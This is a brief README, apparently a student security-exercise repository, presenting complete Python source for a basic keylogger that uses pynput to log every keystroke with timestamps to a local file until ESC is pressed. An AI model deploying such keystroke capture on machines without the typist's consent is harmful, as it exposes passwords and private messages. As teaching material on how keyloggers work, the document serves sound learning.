# PRODIGY_CS_04
The SIMPLE KEYLOGGER TOOL is a basic program designed to capture and log keystrokes on a computer. It records every key pressed by the user, including both alphanumeric characters and special keys. 
pip install pynput
from pynput import keyboard
import logging

# Setup logging configuration
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        # Log the key press
        logging.info(f'{key.char}')
    except AttributeError:
        # Special keys (e.g., space, enter) are handled here
        logging.info(f'{key}')

def on_release(key):
    # Stop the listener with ESC key
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
